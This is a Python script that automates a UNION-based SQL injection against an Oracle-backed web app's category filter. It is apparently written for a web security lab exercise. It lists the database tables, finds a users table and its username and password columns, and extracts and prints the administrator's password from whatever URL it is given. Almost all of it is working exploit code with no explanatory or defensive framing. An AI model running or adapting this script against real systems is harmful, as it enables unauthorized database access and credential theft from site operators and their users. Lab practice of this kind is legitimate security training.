from http.client import PAYMENT_REQUIRED
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# function to make request to application and return the response


def make_request(url, sql_payload):
    path = "/filter?category=Lifestyle"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

# Step 4: find users table


def sqli_users_table(url):
    sql_payload = "' UNION SELECT NULL, TABLE_NAME FROM all_tables--"
    res = make_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    myregex = re.compile(r'^USERS\_.*')
    users_table = soup.find(text=myregex)
    return users_table

# Step 5: find username, password columns


def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT NULL, COLUMN_NAME FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = make_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    user_regex = re.compile(r'^USERNAME\_.*')
    pass_regex = re.compile(r'^PASSWORD\_.*')
    username_column = soup.find(text=user_regex)
    password_column = soup.find(text=pass_regex)
    return username_column, password_column

# Step 6: find admin password


def sqli_admin_password(url, users_table, username_column, password_column):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (
        username_column, password_column, users_table)
    res = make_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(
        text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("Looking for users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table: %s " % users_table)
        # find username and password columns
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column: %s" % username_column)
            print("Found the password column: %s" % password_column)
            # find the administrator password:
            admin_password = sqli_admin_password(
                url, users_table, username_column, password_column)
            if admin_password:
                print("Found the admin password: %s" % admin_password)
            else:
                print("Did not find the admin password")
        else:
            print("Did not find the username and/password columns")
    else:
        print("Did not find the users table.")
